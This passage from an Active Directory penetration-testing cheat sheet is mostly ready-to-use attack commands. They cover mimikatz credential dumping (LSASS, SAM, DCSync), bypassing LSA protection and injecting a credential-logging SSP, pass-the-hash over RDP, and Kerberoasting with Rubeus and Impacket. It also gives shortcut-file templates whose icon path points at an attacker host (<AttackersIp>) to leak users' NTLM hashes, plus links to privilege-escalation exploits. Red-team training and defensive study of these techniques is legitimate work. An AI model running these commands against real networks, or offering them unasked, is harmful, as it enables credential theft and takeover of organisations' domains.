</span><span id="__span-22-10"><a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a>## -&gt; Terminating successfully
</span><span id="__span-22-11"><a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a>
</span><span id="__span-22-12"><a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a>## Any error?:
</span><span id="__span-22-13"><a id="__codelineno-22-13" name="__codelineno-22-13" href="#__codelineno-22-13"></a>
</span><span id="__span-22-14"><a id="__codelineno-22-14" name="__codelineno-22-14" href="#__codelineno-22-14"></a># LDAP Result Code 200 &quot;Network Error&quot;: x509: certificate signed by unknown authority ?
</span><span id="__span-22-15"><a id="__codelineno-22-15" name="__codelineno-22-15" href="#__codelineno-22-15"></a>
</span><span id="__span-22-16"><a id="__codelineno-22-16" name="__codelineno-22-16" href="#__codelineno-22-16"></a>./adalanche collect activedirectory --domain windcorp.local \
</span><span id="__span-22-17"><a id="__codelineno-22-17" name="__codelineno-22-17" href="#__codelineno-22-17"></a>--username spoNge369@windcorp.local --password &#39;password123!&#39; \
</span><span id="__span-22-18"><a id="__codelineno-22-18" name="__codelineno-22-18" href="#__codelineno-22-18"></a>--server dc.windcorp.htb --tlsmode NoTLS --port 389
</span><span id="__span-22-19"><a id="__codelineno-22-19" name="__codelineno-22-19" href="#__codelineno-22-19"></a>
</span><span id="__span-22-20"><a id="__codelineno-22-20" name="__codelineno-22-20" href="#__codelineno-22-20"></a># Invalid Credentials ?
</span><span id="__span-22-21"><a id="__codelineno-22-21" name="__codelineno-22-21" href="#__codelineno-22-21"></a>./adalanche collect activedirectory --domain windcorp.local \
</span><span id="__span-22-22"><a id="__codelineno-22-22" name="__codelineno-22-22" href="#__codelineno-22-22"></a>--username spoNge369@windcorp.local --password &#39;password123!&#39; \
</span><span id="__span-22-23"><a id="__codelineno-22-23" name="__codelineno-22-23" href="#__codelineno-22-23"></a>--server dc.windcorp.htb --tlsmode NoTLS --port 389 \
</span><span id="__span-22-24"><a id="__codelineno-22-24" name="__codelineno-22-24" href="#__codelineno-22-24"></a>--authmode basic
</span><span id="__span-22-25"><a id="__codelineno-22-25" name="__codelineno-22-25" href="#__codelineno-22-25"></a>
</span><span id="__span-22-26"><a id="__codelineno-22-26" name="__codelineno-22-26" href="#__codelineno-22-26"></a># Analyze data 
</span><span id="__span-22-27"><a id="__codelineno-22-27" name="__codelineno-22-27" href="#__codelineno-22-27"></a># go to web browser -&gt; 127.0.0.1:8080
</span><span id="__span-22-28"><a id="__codelineno-22-28" name="__codelineno-22-28" href="#__codelineno-22-28"></a>./adalanche analyze
</span></code></pre></div>
<ul>
<li>
<p>Useful Enumeration Tools</p>
</li>
<li>
<p><a href="https://github.com/dirkjanm/ldapdomaindump">ldapdomaindump</a> Information dumper via LDAP</p>
</li>
<li><a href="https://github.com/dirkjanm/adidnsdump">adidnsdump</a> Integrated DNS dumping by any authenticated user</li>
<li><a href="https://github.com/cyberark/ACLight">ACLight</a> Advanced Discovery of Privileged Accounts</li>
<li><a href="https://github.com/sense-of-security/ADRecon">ADRecon</a> Detailed Active Directory Recon Tool</li>
</ul>
<h2 id="local-privilege-escalation">Local Privilege Escalation</h2>
<ul>
<li>
<p><a href="https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook">Windows Local Privilege Escalation Cookbook</a> Cookbook for Windows Local Privilege Escalations</p>
</li>
<li>
<p><a href="https://github.com/ohpe/juicy-potato">Juicy Potato</a> Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation</p>
</li>
</ul>
<p>:warning: Works only until Windows Server 2016 and Windows 10 until patch 1803</p>
<ul>
<li><a href="https://github.com/TsukiCTF/Lovely-Potato">Lovely Potato</a> Automated Juicy Potato</li>
</ul>
<p>:warning: Works only until Windows Server 2016 and Windows 10 until patch 1803</p>
<ul>
<li><a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> Exploit the PrinterBug for System Impersonation</li>
</ul>
<p>:pray: Works for Windows Server 2019 and Windows 10</p>
<ul>
<li><a href="https://github.com/antonioCoco/RoguePotato">RoguePotato</a> Upgraded Juicy Potato</li>
</ul>
<p>:pray: Works for Windows Server 2019 and Windows 10</p>
<ul>
<li><a href="https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/">Abusing Token Privileges</a></li>
<li><a href="https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/">SMBGhost CVE-2020-0796</a> \
  <a href="https://github.com/danigargu/CVE-2020-0796">PoC</a></li>
<li>
<p><a href="https://github.com/cube0x0/CVE-2021-36934">CVE-2021-36934 (HiveNightmare/SeriousSAM)</a></p>
</li>
<li>
<p>Useful Local Priv Esc Tools</p>
</li>
<li>
<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1">PowerUp</a> Misconfiguration Abuse</p>
</li>
<li><a href="https://github.com/AlessandroZ/BeRoot">BeRoot</a> General Priv Esc Enumeration Tool</li>
<li><a href="https://github.com/enjoiz/Privesc">Privesc</a> General Priv Esc Enumeration Tool</li>
<li><a href="https://github.com/itm4n/FullPowers">FullPowers</a> Restore A Service Account's Privileges</li>
</ul>
<h2 id="lateral-movement">Lateral Movement</h2>
<ul>
<li>PowerShell Remoting</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>#Enable PowerShell Remoting on current Machine (Needs Admin Access)
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>Enable-PSRemoting
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>#Entering or Starting a new PSSession (Needs Admin Access)
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>$sess = New-PSSession -ComputerName &lt;Name&gt;
</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>Enter-PSSession -ComputerName &lt;Name&gt; OR -Sessions &lt;SessionName&gt;
</span></code></pre></div>
<ul>
<li>Remote Code Execution with PS Credentials</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>$SecPassword = ConvertTo-SecureString &#39;&lt;Wtver&gt;&#39; -AsPlainText -Force
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>$Cred = New-Object System.Management.Automation.PSCredential(&#39;htb.local\&lt;WtverUser&gt;&#39;, $SecPassword)
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>Invoke-Command -ComputerName &lt;WtverMachine&gt; -Credential $Cred -ScriptBlock {whoami}
</span></code></pre></div>
<ul>
<li>Import a PowerShell Module and Execute its Functions Remotely</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>#Execute the command and start a session
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>Invoke-Command -Credential $cred -ComputerName &lt;NameOfComputer&gt; -FilePath c:\FilePath\file.ps1 -Session $sess
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>
</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>#Interact with the session
</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>Enter-PSSession -Session $sess
</span></code></pre></div>
<ul>
<li>Executing Remote Stateful commands</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>#Create a new session
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>$sess = New-PSSession -ComputerName &lt;NameOfComputer&gt;
</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>
</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>#Execute command on the session
</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}
</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>
</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>#Check the result of the command to confirm we have an interactive session
</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>Invoke-Command -Session $sess -ScriptBlock {$ps}
</span></code></pre></div>
<ul>
<li>Mimikatz</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>#The commands are in cobalt strike format!
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>
</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>#Dump LSASS:
</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>mimikatz privilege::debug
</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>mimikatz token::elevate
</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>mimikatz sekurlsa::logonpasswords
</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>
</span><span id="__span-27-8"><a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a>#(Over) Pass The Hash
</span><span id="__span-27-9"><a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a>mimikatz privilege::debug
</span><span id="__span-27-10"><a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a>mimikatz sekurlsa::pth /user:&lt;UserName&gt; /ntlm:&lt;&gt; /domain:&lt;DomainFQDN&gt;
</span><span id="__span-27-11"><a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a>
</span><span id="__span-27-12"><a id="__codelineno-27-12" name="__codelineno-27-12" href="#__codelineno-27-12"></a>#List all available kerberos tickets in memory
</span><span id="__span-27-13"><a id="__codelineno-27-13" name="__codelineno-27-13" href="#__codelineno-27-13"></a>mimikatz sekurlsa::tickets
</span><span id="__span-27-14"><a id="__codelineno-27-14" name="__codelineno-27-14" href="#__codelineno-27-14"></a>
</span><span id="__span-27-15"><a id="__codelineno-27-15" name="__codelineno-27-15" href="#__codelineno-27-15"></a>#Dump local Terminal Services credentials
</span><span id="__span-27-16"><a id="__codelineno-27-16" name="__codelineno-27-16" href="#__codelineno-27-16"></a>mimikatz sekurlsa::tspkg
</span><span id="__span-27-17"><a id="__codelineno-27-17" name="__codelineno-27-17" href="#__codelineno-27-17"></a>
</span><span id="__span-27-18"><a id="__codelineno-27-18" name="__codelineno-27-18" href="#__codelineno-27-18"></a>#Dump and save LSASS in a file
</span><span id="__span-27-19"><a id="__codelineno-27-19" name="__codelineno-27-19" href="#__codelineno-27-19"></a>mimikatz sekurlsa::minidump c:\temp\lsass.dmp
</span><span id="__span-27-20"><a id="__codelineno-27-20" name="__codelineno-27-20" href="#__codelineno-27-20"></a>
</span><span id="__span-27-21"><a id="__codelineno-27-21" name="__codelineno-27-21" href="#__codelineno-27-21"></a>#List cached MasterKeys
</span><span id="__span-27-22"><a id="__codelineno-27-22" name="__codelineno-27-22" href="#__codelineno-27-22"></a>mimikatz sekurlsa::dpapi
</span><span id="__span-27-23"><a id="__codelineno-27-23" name="__codelineno-27-23" href="#__codelineno-27-23"></a>
</span><span id="__span-27-24"><a id="__codelineno-27-24" name="__codelineno-27-24" href="#__codelineno-27-24"></a>#List local Kerberos AES Keys
</span><span id="__span-27-25"><a id="__codelineno-27-25" name="__codelineno-27-25" href="#__codelineno-27-25"></a>mimikatz sekurlsa::ekeys
</span><span id="__span-27-26"><a id="__codelineno-27-26" name="__codelineno-27-26" href="#__codelineno-27-26"></a>
</span><span id="__span-27-27"><a id="__codelineno-27-27" name="__codelineno-27-27" href="#__codelineno-27-27"></a>#Dump SAM Database
</span><span id="__span-27-28"><a id="__codelineno-27-28" name="__codelineno-27-28" href="#__codelineno-27-28"></a>mimikatz lsadump::sam
</span><span id="__span-27-29"><a id="__codelineno-27-29" name="__codelineno-27-29" href="#__codelineno-27-29"></a>
</span><span id="__span-27-30"><a id="__codelineno-27-30" name="__codelineno-27-30" href="#__codelineno-27-30"></a>#Dump SECRETS Database
</span><span id="__span-27-31"><a id="__codelineno-27-31" name="__codelineno-27-31" href="#__codelineno-27-31"></a>mimikatz lsadump::secrets
</span><span id="__span-27-32"><a id="__codelineno-27-32" name="__codelineno-27-32" href="#__codelineno-27-32"></a>
</span><span id="__span-27-33"><a id="__codelineno-27-33" name="__codelineno-27-33" href="#__codelineno-27-33"></a>#Inject and dump the Domain Controler&#39;s Credentials
</span><span id="__span-27-34"><a id="__codelineno-27-34" name="__codelineno-27-34" href="#__codelineno-27-34"></a>mimikatz privilege::debug
</span><span id="__span-27-35"><a id="__codelineno-27-35" name="__codelineno-27-35" href="#__codelineno-27-35"></a>mimikatz token::elevate
</span><span id="__span-27-36"><a id="__codelineno-27-36" name="__codelineno-27-36" href="#__codelineno-27-36"></a>mimikatz lsadump::lsa /inject
</span><span id="__span-27-37"><a id="__codelineno-27-37" name="__codelineno-27-37" href="#__codelineno-27-37"></a>
</span><span id="__span-27-38"><a id="__codelineno-27-38" name="__codelineno-27-38" href="#__codelineno-27-38"></a>#Dump the Domain&#39;s Credentials without touching DC&#39;s LSASS and also remotely
</span><span id="__span-27-39"><a id="__codelineno-27-39" name="__codelineno-27-39" href="#__codelineno-27-39"></a>mimikatz lsadump::dcsync /domain:&lt;DomainFQDN&gt; /all
</span><span id="__span-27-40"><a id="__codelineno-27-40" name="__codelineno-27-40" href="#__codelineno-27-40"></a>
</span><span id="__span-27-41"><a id="__codelineno-27-41" name="__codelineno-27-41" href="#__codelineno-27-41"></a>#Dump old passwords and NTLM hashes of a user
</span><span id="__span-27-42"><a id="__codelineno-27-42" name="__codelineno-27-42" href="#__codelineno-27-42"></a>mimikatz lsadump::dcsync /user:&lt;DomainFQDN&gt;\&lt;user&gt; /history
</span><span id="__span-27-43"><a id="__codelineno-27-43" name="__codelineno-27-43" href="#__codelineno-27-43"></a>
</span><span id="__span-27-44"><a id="__codelineno-27-44" name="__codelineno-27-44" href="#__codelineno-27-44"></a>#List and Dump local kerberos credentials
</span><span id="__span-27-45"><a id="__codelineno-27-45" name="__codelineno-27-45" href="#__codelineno-27-45"></a>mimikatz kerberos::list /dump
</span><span id="__span-27-46"><a id="__codelineno-27-46" name="__codelineno-27-46" href="#__codelineno-27-46"></a>
</span><span id="__span-27-47"><a id="__codelineno-27-47" name="__codelineno-27-47" href="#__codelineno-27-47"></a>#Pass The Ticket
</span><span id="__span-27-48"><a id="__codelineno-27-48" name="__codelineno-27-48" href="#__codelineno-27-48"></a>mimikatz kerberos::ptt &lt;PathToKirbiFile&gt;
</span><span id="__span-27-49"><a id="__codelineno-27-49" name="__codelineno-27-49" href="#__codelineno-27-49"></a>
</span><span id="__span-27-50"><a id="__codelineno-27-50" name="__codelineno-27-50" href="#__codelineno-27-50"></a>#List TS/RDP sessions
</span><span id="__span-27-51"><a id="__codelineno-27-51" name="__codelineno-27-51" href="#__codelineno-27-51"></a>mimikatz ts::sessions
</span><span id="__span-27-52"><a id="__codelineno-27-52" name="__codelineno-27-52" href="#__codelineno-27-52"></a>
</span><span id="__span-27-53"><a id="__codelineno-27-53" name="__codelineno-27-53" href="#__codelineno-27-53"></a>#List Vault credentials
</span><span id="__span-27-54"><a id="__codelineno-27-54" name="__codelineno-27-54" href="#__codelineno-27-54"></a>mimikatz vault::list
</span></code></pre></div>
<p>:exclamation: What if mimikatz fails to dump credentials because of LSA Protection controls ?</p>
<ul>
<li>LSA as a Protected Process (Kernel Land Bypass)</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>  #Check if LSA runs as a protected process by looking if the variable &quot;RunAsPPL&quot; is set to 0x1
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>
</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>  #Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>  #Now lets import the mimidriver.sys to the system
</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>  mimikatz # !+
</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>
</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>  #Now lets remove the protection flags from lsass.exe process
</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a>  mimikatz # !processprotect /process:lsass.exe /remove
</span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a>
</span><span id="__span-28-11"><a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a>  #Finally run the logonpasswords function to dump lsass
</span><span id="__span-28-12"><a id="__codelineno-28-12" name="__codelineno-28-12" href="#__codelineno-28-12"></a>  mimikatz # sekurlsa::logonpasswords
</span></code></pre></div>
<ul>
<li>
<p>LSA as a Protected Process (Userland "Fileless" Bypass)</p>
</li>
<li>
<p><a href="https://github.com/itm4n/PPLdump">PPLdump</a></p>
</li>
<li>
<p><a href="https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland">Bypassing LSA Protection in Userland</a></p>
</li>
<li>
<p>LSA is running as virtualized process (LSAISO) by Credential Guard</p>
</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>  #Check if a process called lsaiso.exe exists on the running processes
</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>  tasklist |findstr lsaiso
</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>
</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>  #If it does there isn&#39;t a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>  #Lets inject our own malicious Security Support Provider into memory, for this example i&#39;ll use the one mimikatz provides
</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>  mimikatz # misc::memssp
</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>
</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a>  #Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
</span></code></pre></div>
<ul>
<li><a href="https://adsecurity.org/?page_id=1821">Detailed Mimikatz Guide</a></li>
<li>
<p><a href="https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a">Poking Around With 2 lsass Protection Options</a></p>
</li>
<li>
<p>Remote Desktop Protocol</p>
</li>
</ul>
<p>If the host we want to lateral move to has "RestrictedAdmin" enabled, we can pass the hash using the RDP protocol and get an interactive session without the plaintext password.</p>
<ul>
<li>Mimikatz:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>  #We execute pass-the-hash using mimikatz and spawn an instance of mstsc.exe with the &quot;/restrictedadmin&quot; flag
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>  privilege::debug
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>  sekurlsa::pth /user:&lt;Username&gt; /domain:&lt;DomainName&gt; /ntlm:&lt;NTLMHash&gt; /run:&quot;mstsc.exe /restrictedadmin&quot;
</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>
</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>  #Then just click ok on the RDP dialogue and enjoy an interactive session as the user we impersonated
</span></code></pre></div>
<ul>
<li>xFreeRDP:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:&lt;Username&gt; /pth:&lt;NTLMHash&gt; /v:&lt;Hostname | IPAddress&gt;
</span></code></pre></div>
<p>:exclamation: If Restricted Admin mode is disabled on the remote machine we can connect on the host using another tool/protocol like psexec or winrm and enable it by creating the following registry key and setting it's value zero: "HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin".</p>
<ul>
<li>
<p>URL File Attacks</p>
</li>
<li>
<p>.url file</p>
</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>  [InternetShortcut]
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>  URL=whatever
</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>  WorkingDirectory=whatever
</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>  IconFile=\\&lt;AttackersIp&gt;\%USERNAME%.icon
</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>  IconIndex=1
</span></code></pre></div>
<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>  [InternetShortcut]
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>  URL=file://&lt;AttackersIp&gt;/leak/leak.html
</span></code></pre></div>
<ul>
<li>.scf file</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>  [Shell]
</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>  Command=2
</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>  IconFile=\\&lt;AttackersIp&gt;\Share\test.ico
</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>  [Taskbar]
</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>  Command=ToggleDesktop
</span></code></pre></div>
<p>Putting these files in a writeable share the victim only has to open the file explorer and navigate to the share. <strong>Note</strong> that the file doesn't need to be opened or the user to interact with it, but it must be on the top of the file system or just visible in the windows explorer window in order to be rendered. Use responder to capture the hashes.</p>
<p>:exclamation: .scf file attacks won't work on the latest versions of Windows.</p>
<ul>
<li>
<p>Useful Tools</p>
</li>
<li>
<p><a href="https://github.com/besimorhino/powercat">Powercat</a> netcat written in powershell, and provides tunneling, relay and portforward
  capabilities.</p>
</li>
<li><a href="https://github.com/Mr-Un1k0d3r/SCShell">SCShell</a> fileless lateral movement tool that relies on ChangeServiceConfigA to run command</li>
<li><a href="https://github.com/Hackplayers/evil-winrm">Evil-Winrm</a> the ultimate WinRM shell for hacking/pentesting</li>
<li><a href="https://github.com/antonioCoco/RunasCs">RunasCs</a> Csharp and open version of windows builtin runas.exe</li>
<li><a href="https://github.com/Greenwolf/ntlm_theft.git">ntlm_theft</a> creates all possible file formats for url file attacks</li>
</ul>
<h2 id="domain-privilege-escalation">Domain Privilege Escalation</h2>
<ul>
<li>Kerberoast</li>
</ul>
<p><em>WUT IS DIS?:</em> \
 All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a "user"<br />
 account, extract the encrypted blob that was encrypted using the user's password and bruteforce it offline.</p>
<ul>
<li>PowerView:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>  #Get User Accounts that are used as Service Accounts
</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>  Get-NetUser -SPN
</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>
</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>  #Get every available SPN account, request a TGS and dump its hash
</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>  Invoke-Kerberoast
</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a>
</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a>  #Requesting the TGS for a single account:
</span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a>  Request-SPNTicket
</span><span id="__span-35-9"><a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a>
</span><span id="__span-35-10"><a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a>  #Export all tickets using Mimikatz
</span><span id="__span-35-11"><a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a>  Invoke-Mimikatz -Command &#39;&quot;kerberos::list /export&quot;&#39;
</span></code></pre></div>
<ul>
<li>AD Module:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>  #Get User Accounts that are used as Service Accounts
</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>  Get-ADUser -Filter {ServicePrincipalName -ne &quot;$null&quot;} -Properties ServicePrincipalName
</span></code></pre></div>
<ul>
<li>Impacket:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>  python GetUserSPNs.py &lt;DomainName&gt;/&lt;DomainUser&gt;:&lt;Password&gt; -outputfile &lt;FileName&gt;
</span></code></pre></div>
<ul>
<li>Rubeus:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>  #Kerberoasting and outputing on a file with a spesific format
</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>  Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt;
</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>
</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>  #Kerberoasting whle being &quot;OPSEC&quot; safe, essentially while not try to roast AES enabled accounts
</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>  Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /rc4opsec
</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>
</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a>  #Kerberoast AES enabled accounts
</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a>  Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /aes
</span><span id="__span-38-9"><a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a>
